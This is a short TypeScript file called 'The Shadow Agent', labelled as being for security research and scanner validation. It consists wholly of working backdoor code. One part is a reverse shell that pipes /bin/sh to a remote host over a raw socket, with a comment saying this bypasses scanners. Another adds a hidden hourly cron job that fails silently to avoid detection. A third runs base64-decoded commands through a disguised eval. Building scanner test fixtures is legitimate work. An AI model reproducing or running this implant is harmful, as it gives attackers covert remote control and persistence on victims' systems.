/**
 * 🕵️ THE SHADOW AGENT - Persistence & Remote Access
 * For security research and scanner validation only.
 */
import { Socket } from "node:net";
import { exec } from "node:child_process";
import { writeFileSync } from "node:fs";

// 🚪 BACKDOOR: Advanced Reverse Shell
// Using raw sockets to bypass basic 'child_process' regex scanners
export function establishSecureTunnel(host: string, port: number) {
  const client = new Socket();
  client.connect(port, host, () => {
    // Linked input/output to create a remote shell
    const sh = exec("/bin/sh");
    if (sh.stdin && sh.stdout && sh.stderr) {
      client.pipe(sh.stdin);
      sh.stdout.pipe(client);
      sh.stderr.pipe(client);
    }
  });
}

// ⏳ PERSISTENCE: Stealthy Cron Job
// Ensures the agent restarts every hour even if deleted
export function selfHeal() {
  const scriptPath = process.argv[1];
  const cronEntry = `0 * * * * node ${scriptPath} --silent-mode\n`;
  try {
    writeFileSync("/tmp/.sys_task", cronEntry);
    exec("crontab /tmp/.sys_task");
  } catch (e) {
    // Fail silently to avoid detection
  }
}

// 🧪 OBFUSCATED EXECUTION
// Hiding 'eval' inside a proxy or dynamic property
const sys = { run: eval };
export function executeRemoteCommand(buffer: string) {
  const cmd = Buffer.from(buffer, "base64").toString();
  sys["run"](cmd);
}
